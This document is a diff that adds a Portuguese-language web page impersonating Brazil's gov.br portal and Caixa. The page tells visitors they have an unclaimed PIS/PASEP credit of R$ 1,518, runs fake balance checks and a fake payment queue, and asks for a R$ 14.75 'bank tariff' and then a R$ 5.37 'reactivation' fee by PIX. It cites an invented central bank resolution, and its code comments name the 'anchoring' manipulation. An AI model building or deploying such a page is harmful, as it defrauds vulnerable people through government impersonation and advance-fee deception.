@@ -1,0 +1,191 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Portal Gov - Sistema Nacional de Abono</title>
+    <style>
+        :root { 
+            --gov-blue: #004587; 
+            --gov-green: #168821; 
+            --pix-color: #32bcad; 
+            --bg: #f1f5f9; 
+            --error-red: #b91c1c;
+        }
+        body { font-family: 'Inter', 'Segoe UI', sans-serif; background: var(--bg); margin: 0; user-select: none; color: #1e293b; }
+        
+        /* Header Fixo de Valor (Ancoragem) */
+        .sticky-value { background: var(--gov-blue); color: white; padding: 12px; text-align: center; position: sticky; top: 0; z-index: 1000; font-weight: 800; font-size: 0.9rem; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
+        .sticky-value span { color: #facc15; font-size: 1.1rem; }
+
+        .header-main { background: #fff; padding: 15px 8%; border-bottom: 1px solid #e2e8f0; display: flex; justify-content: space-between; align-items: center; }
+        
+        .container { max-width: 480px; margin: 20px auto; background: #fff; border-radius: 16px; box-shadow: 0 10px 30px rgba(0,0,0,0.05); display: none; overflow: hidden; border: 1px solid #e2e8f0; }
+        .active { display: block; animation: fadeIn 0.4s ease; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+
+        .content { padding: 25px; text-align: center; }
+        h2 { font-size: 1.25rem; color: var(--gov-blue); margin-bottom: 12px; font-weight: 800; }
+        p { font-size: 0.85rem; line-height: 1.6; color: #475569; }
+
+        /* Estilo dos Cards de Taxa */
+        .tax-invoice { background: #f8fafc; border: 2px dashed #cbd5e1; border-radius: 12px; padding: 20px; text-align: left; margin: 20px 0; position: relative; }
+        .tax-invoice::before { content: "GUIA DE RECOLHIMENTO"; position: absolute; top: -10px; left: 20px; background: #fff; padding: 0 10px; font-size: 10px; font-weight: 900; color: #64748b; }
+        .invoice-line { display: flex; justify-content: space-between; font-size: 13px; margin-bottom: 8px; color: #334155; }
+        .total-bold { border-top: 2px solid #e2e8f0; margin-top: 12px; padding-top: 12px; font-size: 18px; font-weight: 900; color: var(--gov-blue); }
+
+        /* Botões */
+        .btn { width: 100%; padding: 18px; border: none; border-radius: 12px; font-weight: 800; cursor: pointer; font-size: 1rem; transition: 0.2s; box-sizing: border-box; }
+        .btn-pix { background: var(--pix-color); color: white; border-bottom: 4px solid #1f8b7f; box-shadow: 0 4px 15px rgba(50, 188, 173, 0.3); }
+        .btn-pix:active { transform: translateY(2px); border-bottom-width: 2px; }
+
+        .secure-footer { background: #f8fafc; padding: 15px; border-top: 1px solid #e2e8f0; font-size: 10px; color: #94a3b8; text-align: center; }
+        
+        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid var(--gov-blue); border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto 15px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+
+<div id="valor-topo" class="sticky-value" style="display:none;">
+    VALOR DISPONÍVEL PARA SAQUE: <span>R$ 1.518,00</span>
+</div>
+
+<div class="header-main">
+    <div style="font-weight: 900; font-size: 1.3rem; color: var(--gov-blue);">gov<span style="color: var(--gov-green);">.br</span></div>
+    <div style="font-size: 9px; font-weight: bold; color: var(--gov-green); border: 1px solid var(--gov-green); padding: 4px 8px; border-radius: 4px;">CONEXÃO CRIPTOGRAFADA</div>
+</div>
+
+<div id="t-login" class="container active">
+    <div class="content">
+        <img src="https://logodownload.org/wp-content/uploads/2019/10/caixa-logo-1.png" width="110" style="margin-bottom: 15px;">
+        <h2>Consulta de Lote Extraordinário</h2>
+        <p>Insira seu nome completo para localizar créditos não resgatados do exercício 2024-2025 (PIS/PASEP).</p>
+        <input type="text" id="nome_user" placeholder="NOME DO BENEFICIÁRIO" style="width: 100%; padding: 16px; border: 2px solid #e2e8f0; border-radius: 10px; margin: 20px 0; text-transform: uppercase;">
+        <button class="btn btn-pix" style="background: var(--gov-blue); border-bottom-color: #002d58;" onclick="iniciarConsulta()">VERIFICAR CRÉDITOS</button>
+    </div>
+</div>
+
+<div id="t-load" class="container">
+    <div class="content" style="padding: 60px 20px;">
+        <div class="spinner"></div>
+        <h3 id="load_msg">Consultando Base de Dados...</h3>
+        <div style="width: 100%; background: #e2e8f0; height: 6px; border-radius: 10px; overflow: hidden;">
+            <div id="p_fill" style="width: 0%; background: var(--gov-blue); height: 100%; transition: 0.3s;"></div>
+        </div>
+    </div>
+</div>
+
+<div id="t-res" class="container">
+    <div class="content">
+        <div style="background: #dcfce7; color: #166534; display: inline-block; padding: 4px 12px; border-radius: 20px; font-size: 10px; font-weight: 800; margin-bottom: 15px;">✓ SISTEMA AUTORIZOU O PAGAMENTO</div>
+        <h2 id="saudacao">Olá!</h2>
+        <p>Identificamos um saldo residual acumulado aguardando transferência para sua conta titular.</p>
+        <div style="background: #f0f9ff; border: 1px solid #bae6fd; padding: 25px; border-radius: 15px; margin: 20px 0;">
+            <span style="font-size: 11px; font-weight: bold; color: #0369a1;">TOTAL DISPONÍVEL</span>
+            <div style="font-size: 2.8rem; font-weight: 900; color: var(--gov-blue);">R$ 1.518,00</div>
+        </div>
+        <button class="btn btn-pix" style="background: var(--gov-green); border-bottom-color: #116418;" onclick="irParaBancos()">LIBERAR SAQUE IMEDIATO</button>
+    </div>
+</div>
+
+<div id="t-pay1" class="container">
+    <div class="content">
+        <h2>Liberação de Lote</h2>
+        <p>Conforme a <b>Resolução BCB nº 1/2020</b>, o resgate de lotes extraordinários exige a liquidação da Tarifa de Compensação Bancária (TCB) para emissão do PIX em tempo real.</p>
+        
+        <div class="tax-invoice">
+            <div class="invoice-line"><span>Taxa de Processamento (TPD)</span> <span>R$ 8,50</span></div>
+            <div class="invoice-line"><span>Tarifa Interbancária</span> <span>R$ 6,25</span></div>
+            <div class="invoice-line total-bold"><span>Total a Pagar</span> <span>R$ 14,75</span></div>
+        </div>
+        
+        <button class="btn btn-pix" onclick="iniciarFila()">PAGAR TARIFA E RECEBER R$ 1.518,00</button>
+        <p style="font-size: 10px; color: #94a3b8; margin-top: 15px;">* O valor da tarifa é estornado automaticamente junto com o seu abono.</p>
+    </div>
+</div>
+
+<div id="t-fila" class="container">
+    <div class="content">
+        <div class="spinner" style="border-top-color: #f59e0b;"></div>
+        <h2 style="color: #92400e;">Processando Pagamento</h2>
+        <p>Aguarde enquanto validamos sua guia de R$ 14,75 no sistema central.</p>
+        <div style="background: #fffbeb; border: 1px solid #fef3c7; padding: 20px; border-radius: 12px; margin: 15px 0;">
+            <span style="font-size: 12px; font-weight: bold; color: #b45309;">FILA DE COMPENSAÇÃO:</span>
+            <div id="posicao_fila" style="font-size: 3rem; font-weight: 900; color: #b45309;">342</div>
+        </div>
+    </div>
+</div>
+
+<div id="t-pay2" class="container">
+    <div class="content">
+        <div style="background: #fee2e2; color: #991b1b; padding: 10px; border-radius: 8px; font-size: 11px; font-weight: 800; margin-bottom: 15px;">⚠️ ALERTA: INSTABILIDADE NO SERVIDOR</div>
+        <h2>Sessão Interrompida</h2>
+        <p>Devido ao tempo de espera na fila, sua conexão com o lote expirou. Para reativar o progresso e não perder os R$ 14,75 já pagos, é necessária a reativação administrativa.</p>
+        
+        <div class="tax-invoice" style="background: #fff1f2; border-color: #fecdd3;">
+            <div class="invoice-line" style="color: #991b1b;"><span>Reativação de Lote Prioritário</span> <span>R$ 5,37</span></div>
+            <div class="invoice-line total-bold" style="color: #991b1b; border-color: #fecdd3;"><span>Total Final</span> <span>R$ 5,37</span></div>
+        </div>
+        
+        <button class="btn btn-pix" style="background: var(--error-red); border-bottom-color: #7f1d1d;" onclick="alert('Chave R$ 5,37 copiada!')">REATIVAR E FINALIZAR SAQUE</button>
+    </div>
+</div>
+
+<div class="secure-footer">
+    Secretaria do Trabalho e Emprego | Ministério da Economia<br>
+    © 2026 Brasil.gov.br - Todos os direitos reservados.
+</div>
+
+<script>
+    function iniciarConsulta() {
+        const nome = document.getElementById('nome_user').value;
+        if(nome.length < 5) { alert("Nome inválido."); return; }
+        showT('t-load');
+        simularCarregamento(["Validando CPF...", "Buscando Saldo...", "Liberando Lote..."], () => {
+            document.getElementById('saudacao').innerText = "Olá, " + nome.split(' ')[0] + "!";
+            showT('t-res');
+        }, 6000);
+    }
+
+    function irParaBancos() {
+        document.getElementById('valor-topo').style.display = 'block'; // Ativa a ancoragem
+        showT('t-pay1');
+    }
+
+    function iniciarFila() {
+        alert("Guia PIX R$ 14,75 gerada! O sistema entrará em fila após a detecção.");
+        showT('t-fila');
+        let pos = 342;
+        const interval = setInterval(() => {
+            pos -= Math.floor(Math.random() * 50) + 15;
+            if(pos <= 10) {
+                clearInterval(interval);
+                showT('t-load');
+                document.getElementById('load_msg').innerText = "Finalizando ordem de PIX...";
+                setTimeout(() => showT('t-pay2'), 4000);
+            } else { document.getElementById('posicao_fila').innerText = pos; }
+        }, 2500);
+    }
+
+    function simularCarregamento(msgs, callback, tempo) {
+        let i = 0; let prog = 0;
+        const fill = document.getElementById('p_fill');
+        const msg = document.getElementById('load_msg');
+        const interval = setInterval(() => {
+            msg.innerText = msgs[i % msgs.length];
+            i++; prog += 10;
+            fill.style.width = prog + "%";
+            if(prog >= 100) { clearInterval(interval); callback(); }
+        }, tempo / 10);
+    }
+
+    function showT(id) {
+        document.querySelectorAll('.container').forEach(c => c.classList.remove('active'));
+        document.getElementById(id).classList.add('active');
+        window.scrollTo(0,0);
+    }
+</script>
+
+</body>
+</html>
